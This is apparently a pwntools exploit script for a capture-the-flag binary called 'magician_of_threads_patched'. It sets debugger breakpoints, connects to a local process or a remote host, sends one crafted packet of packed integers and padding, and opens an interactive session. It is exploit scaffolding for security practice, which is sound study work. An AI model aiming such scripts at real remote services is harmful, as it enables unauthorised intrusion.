#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("magician_of_threads_patched")
libc = ELF("./libc.so.6")
gs = """
ida_connect
brva 0x5A0A
b praseInput
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()
p.sendlineafter(b"> ",
                (
                    b'\x01' +
                    p32(0x1337) +
                    p32(0x1338) +
                    p32(0x100) +
                    p32(0x3) +
                    p32(0x10) +
                    b'A'*0x10+b';'
                )
                )
p.interactive()
